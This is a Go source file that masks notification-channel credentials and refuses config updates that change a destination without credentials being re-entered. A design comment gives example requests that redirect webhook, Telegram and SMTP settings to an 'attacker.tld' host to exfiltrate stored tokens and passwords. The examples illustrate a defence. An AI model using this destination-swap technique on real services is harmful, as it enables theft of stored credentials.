package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix identifies a masked value. API responses replace credentials with
// a value using this prefix; update requests treat it as "keep the stored value".
//
// A prefix, rather than an empty string or fixed sentinel, also permits a small
// identifying hint (see MaskedValue) so users can recognize a bot without reentering its key.
const MaskedPrefix = "__masked__"

// MaskedValue generates a masked value:
//
//	"__masked__"              original too short; no hint
//	"__masked__:…ab12cd"      last six characters identify the original
//
// The last six characters often identify a webhook (for example, a WeCom key or
// Feishu bot ID), while its prefix is shared by every bot. Six characters do not
// reveal the credential but help the owner recognize the intended group.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is masked and was left unchanged after the API response.
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the configuration with credential fields masked.
//
// For unknown channel kinds, return an empty map rather than potentially expose
// every credential in the original configuration. Preserve nonsecret fields so
// the UI can still display the configuration normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Treat nested structures such as headers as one secret. Checking each child
		// would require every channel to declare another set of secret-key rules.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means the destination changed without
// an explicit credential decision. See PrepareConfigUpdate for why this is rejected.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // changed destination keys
	Missing []string // credential keys without an explicit decision
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "대상 주소(" + strings.Join(e.Changed, ", ") + ")가 변경되었습니다. 자격 증명 필드(" +
		strings.Join(e.Missing, ", ") + ")를 함께 다시 입력하세요: 새 값을 넣거나, 비워 두어 더는 자격 증명이 필요 없음을 표시하세요. " +
		"기존 자격 증명은 이전 주소에만 유효하므로, 그대로 사용하면 새 주소에 넘겨주는 셈입니다."
}

// PrepareConfigUpdate merges channel configuration while handling destination changes.
//
// Use this instead of plain MergeConfig on the update path. Destination and
// credentials are separate fields, and MergeConfig retains stored values for
// omitted keys. A caller able to PATCH a channel could change only the address
// and make the server send stored credentials to a controlled endpoint:
//
//	webhook  {config:{url:"https://attacker.tld"}}    → original Authorization header sent out
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<realToken>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}       → username and password after STARTTLS
//
// This is silent and requires no redirect, so blocking cross-host redirects does
// not help. It defeats the purpose of keeping credentials out of browser responses.
//
// When any destination key changes, the caller must explicitly decide every
// credential key:
//   - new value: use it
//   - explicit empty string: clear the credential
//   - masked value or omitted key: reject
//
// A masked value means reuse the old credential, which was valid only for the
// old destination. Do not silently drop optional credentials such as webhook
// headers or an email password: an apparently successful update without
// authentication is harder to diagnose than a rejection.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("등록되지 않은 채널 유형입니다: %q", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// A nonstring credential value (such as a headers object) containing the
	// masked sentinel embeds "keep the old value" inside a structure. MergeConfig
	// recognizes only a whole string with the prefix; otherwise it would store
	// the literal "__masked__" and silently break later authentication. Reject it.
	//
	// Check first: the unchanged-destination path returns early. Placing this
	// check later would cover only destination changes.
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find destination keys that really changed; masked means unchanged.
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// With no destination change, merge normally: keep masked values, clear
		// empty strings, and replace other values.
		return MergeConfig(stored, incoming), nil
	}

	// A changed destination requires an explicit decision for each credential.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects masked sentinels embedded in nonstring values.
//
// Masking assumes the entire value is a string. Object fields such as webhook
// headers must be masked or submitted as a whole. An embedded sentinel cannot
// mean "unchanged" and would instead be stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("%s 필드의 내용에 마스킹 표시(%q)가 들어 있습니다. 이 필드는 전체를 비워 두어 기존 값을 유지하거나 전체를 새 값으로 제출해야 하며, 구조체 내부에 마스킹 표시를 끼워 넣을 수 없습니다",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares two configuration values using JSON serialization to
// account for type differences. A frontend number may return from storage as a
// float64, which direct equality would misclassify.
//
// Normalize blank values before comparison: an empty string and a missing key
// mean the same thing because MergeConfig deletes a key set to an empty string.
// Without this, an optional destination left empty (Telegram's base_url uses
// the official address when empty) would follow this path:
//
//	create with base_url:"" → first save deletes the key via MergeConfig
//	→ second save compares incoming "" with an absent key and reports a change
//	→ masked credential causes a 400 asking to reenter credentials
//
// Every later save would fail until the user reentered the Bot Token despite
// making no actual change.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue reports whether a configuration value is blank.
// Its rule must match MergeConfig's clearing rule (strings.TrimSpace(s) == "")
// so deletion and equality checks agree.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming values over stored channel configuration.
//
// Rules:
//   - masked incoming value: keep the stored value (unchanged)
//   - empty incoming string: explicitly clear the key
//   - other incoming value: replace the stored value
//   - key omitted from incoming: keep the stored value (partial update)
//
// Treating an empty string as "clear" is deliberate. The form submits blank
// fields as empty strings; users need a way to remove an incorrect value.
// An omitted key remains distinct from a key explicitly submitted as empty.
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // Masked means unchanged; retain stored value.
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
